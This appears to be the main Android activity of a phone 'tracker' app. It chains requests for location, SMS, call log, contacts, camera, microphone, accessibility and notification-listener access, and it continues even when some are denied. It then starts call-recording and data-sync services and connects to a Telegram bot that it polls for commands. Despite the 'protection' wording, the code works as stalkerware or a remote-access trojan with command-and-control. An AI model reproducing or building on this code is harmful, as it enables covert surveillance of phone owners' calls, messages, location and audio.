package com.abuzahra.tracker

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker
import com.abuzahra.tracker.services.MainTrackerService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    lateinit var webView: WebView
    private val PERMISSIONS_REQUEST_CODE = 101
    private var isSetupComplete = false

    /**
     * مراحل الأذونات - كل مرحلة تتطلب إجراء مختلف
     */
    private enum class SetupStep(val id: Int) {
        BASIC_RUNTIME(0),       // أذونات التشغيل العادية (نافذة واحدة)
        BATTERY_OPTIMIZATION(1),// تجاهل تحسين البطارية
        OVERLAY(2),             // عرض فوق التطبيقات
        USAGE_STATS(3),         // إحصائيات الاستخدام
        NOTIFICATION_LISTENER(4),// مستمع الإشعارات
        ACCESSIBILITY(5);       // خدمة إمكانية الوصول

        fun next(): SetupStep? = entries.getOrNull(id + 1)
    }

    private var currentStep: SetupStep = SetupStep.BASIC_RUNTIME

    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ANSWER_PHONE_CALLS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        setupWebView()
        checkAndRequestPermissions()
    }

    private fun setupWebView() {
        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        webSettings.allowFileAccess = true
        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("file:///android_asset/child_index.html")
    }

    // ==================== ==================== ====================
    //      نظام الأذونات المتقدم (Advanced Permission System)
    // ==================== ==================== ====================

    /**
     * البداية: طلب الأذونات الأساسية
     */
    private fun checkAndRequestPermissions() {
        val step = currentStep
        jsNotify("onPermissionStep", (step.id + 1).toString())

        when (step) {
            SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
            SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
            SetupStep.OVERLAY -> requestOverlayPermission()
            SetupStep.USAGE_STATS -> requestUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> requestNotificationPermission()
            SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
        }
    }

    // --- الخطوة 1: الأذونات الأساسية ---
    private fun requestBasicPermissions() {
        jsNotify("onPermissionPending", "perm-basic")

        val supportedPermissions = runtimePermissions.filter { perm ->
            when (perm) {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED,
                Manifest.permission.POST_NOTIFICATIONS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
                Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT <= Build.VERSION_CODES.P
                else -> true
            }
        }

        val missing = supportedPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
        } else {
            // الأذونات الأساسية مفعّلة بالفعل
            jsNotify("onPermissionGranted", "perm-basic")
            advanceToNextStep()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            // التحقق مما إذا تم منح أذونات الموقع الحرجة
            val locationGranted = grantResults.isNotEmpty() &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED

            if (locationGranted) {
                jsNotify("onPermissionGranted", "perm-basic")
            } else {
                jsNotify("onPermissionGranted", "perm-basic") // نكمل حتى بدون كل الأذونات
                Log.w("MainActivity", "بعض الأذونات لم تُمنح - نكمل التفعيل")
            }
            // نكمل للخطوة التالية حتى لو لم تُمنح كل الأذونات
            advanceToNextStep()
        }
    }

    // --- الخطوة 2: تحسين البطارية ---
    private fun requestBatteryOptimization() {
        jsNotify("onPermissionPending", "perm-battery")
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pwrm.isIgnoringBatteryOptimizations(packageName)) {
            jsNotify("onPermissionGranted", "perm-battery")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, SetupStep.BATTERY_OPTIMIZATION.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تحسين البطارية: ${e.message}")
                jsNotify("onPermissionGranted", "perm-battery")
                advanceToNextStep()
            }
        }
    }

    // --- الخطوة 3: العرض فوق التطبيقات ---
    private fun requestOverlayPermission() {
        jsNotify("onPermissionPending", "perm-overlay")
        if (Settings.canDrawOverlays(this)) {
            jsNotify("onPermissionGranted", "perm-overlay")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SetupStep.OVERLAY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن العرض: ${e.message}")
                jsNotify("onPermissionGranted", "perm-overlay")
                advanceToNextStep()
            }
        }
    }

    // --- الخطوة 4: إحصائيات الاستخدام ---
    private fun requestUsageStatsPermission() {
        jsNotify("onPermissionPending", "perm-usage")
        if (hasUsageStatsPermission()) {
            jsNotify("onPermissionGranted", "perm-usage")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), SetupStep.USAGE_STATS.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الاستخدام: ${e.message}")
                jsNotify("onPermissionGranted", "perm-usage")
                advanceToNextStep()
            }
        }
    }

    // --- الخطوة 5: مستمع الإشعارات ---
    private fun requestNotificationPermission() {
        jsNotify("onPermissionPending", "perm-notif")
        if (isNotificationServiceEnabled()) {
            jsNotify("onPermissionGranted", "perm-notif")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), SetupStep.NOTIFICATION_LISTENER.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الإشعارات: ${e.message}")
                jsNotify("onPermissionGranted", "perm-notif")
                advanceToNextStep()
            }
        }
    }

    // --- الخطوة 6: إمكانية الوصول ---
    private fun requestAccessibilityPermission() {
        jsNotify("onPermissionPending", "perm-access")
        if (isAccessibilityServiceEnabled()) {
            jsNotify("onPermissionGranted", "perm-access")
            onAllSetupComplete()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), SetupStep.ACCESSIBILITY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الوصول: ${e.message}")
                jsNotify("onPermissionGranted", "perm-access")
                onAllSetupComplete()
            }
        }
    }

    // ==================== ==================== ====================
    //      onResume - مفتاح سلسلة الأذونات المتتابعة
    // ==================== ==================== ====================

    override fun onResume() {
        super.onResume()
        // عند عودة المستخدم من صفحة إعدادات النظام، نتحقق من الإذن
        // ونكمل للخطوة التالية تلقائياً
        if (!isSetupComplete) {
            // ننتظر قليلاً ثم نتحقق من الحالة الحالية
            // هذا يعطي النظام وقت لتحديث حالة الإذن
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    /**
     * التحقق من الإذن الحالي وتكملة السلسلة
     */
    private fun checkCurrentStepAndAdvance() {
        val granted = when (currentStep) {
            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
            SetupStep.BASIC_RUNTIME -> true // تم معالجتها في onRequestPermissionsResult
        }

        if (granted) {
            val stepName = when (currentStep) {
                SetupStep.BATTERY_OPTIMIZATION -> "perm-battery"
                SetupStep.OVERLAY -> "perm-overlay"
                SetupStep.USAGE_STATS -> "perm-usage"
                SetupStep.NOTIFICATION_LISTENER -> "perm-notif"
                SetupStep.ACCESSIBILITY -> "perm-access"
                SetupStep.BASIC_RUNTIME -> "perm-basic"
            }
            jsNotify("onPermissionGranted", stepName)
            advanceToNextStep()
        }
        // إذا لم يُمنح الإذن، ننتظر onResume التالي (المستخدم يعود مرة أخرى)
    }

    /**
     * الانتقال للخطوة التالية
     */
    private fun advanceToNextStep() {
        val next = currentStep.next()
        if (next != null) {
            currentStep = next
            checkAndRequestPermissions()
        } else {
            onAllSetupComplete()
        }
    }

    // ==================== ==================== ====================
    //      اكتمال التفعيل (Setup Complete)
    // ==================== ==================== ====================

    private fun onAllSetupComplete() {
        if (isSetupComplete) return
        isSetupComplete = true

        Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
        Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()

        // بدء جميع الخدمات
        startAllServices()

        // حفظ معرف الجهاز وتحديث الواجهة
        ensureDeviceId()

        // إرسال معلومات الجهاز للواجهة
        val deviceInfo = buildDeviceInfoHtml()
        jsCall("onAllPermissionsComplete('$deviceInfo')")

        // الاتصال بتيليجرام مباشرة
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                TelegramDirectClient.startCommandPolling(this@MainActivity)
                delay(2000)
                TelegramDirectClient.sendMessage(
                    "✅ <b>تم تشغيل التطبيق بنجاح!</b>\n\n" +
                    "📱 الجهاز: <b>${Build.MODEL}</b>\n" +
                    "🏢 الشركة: <b>${Build.BRAND}</b>\n" +
                    "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b>\n" +
                    "🆔 معرف: <code>$deviceId</code>\n\n" +
                    "🟢 متصل مباشرة بتيليجرام\n" +
                    "📡 جاري استقبال الأوامر...",
                    "HTML"
                )
                jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في الاتصال بتيليجرام: ${e.message}")
                jsCall("onSetupError('خطأ في الاتصال بتيليجرام: ${e.message}')")
            }
        }
    }

    private fun ensureDeviceId() {
        if (SharedPrefsManager.getDeviceId(this) == null) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: System.currentTimeMillis().toString()
            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
        }
    }

    private fun buildDeviceInfoHtml(): String {
        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
               "🟢 الحالة: متصل بتيليجرام مباشرة"
    }

    private fun startAllServices() {
        try {
            val trackerIntent = Intent(this, MainTrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)

            val callIntent = Intent(this, CallRecorderService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)

            DataSyncWorker.startImmediate(this)
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
        }
    }

    // ==================== ==================== ====================
    //      دوال مساعدة (Helper Functions)
    // ==================== ==================== ====================

    private fun isIgnoringBattery(): Boolean {
        return (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
    }

    private fun hasUsageStatsPermission(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { false }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
            false
        } catch (e: Exception) { false }
    }

    /**
     * إرسال أمر JavaScript للواجهة
     */
    private fun jsNotify(method: String, arg: String) {
        webView.post {
            try {
                webView.evaluateJavascript("window.$method('$arg')", null)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ JS: ${e.message}")
            }
        }
    }

    private fun jsCall(script: String) {
        webView.post {
            try {
                webView.evaluateJavascript(script, null)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ JS: ${e.message}")
            }
        }
    }

    fun startWorker() { DataSyncWorker.startImmediate(this) }
}
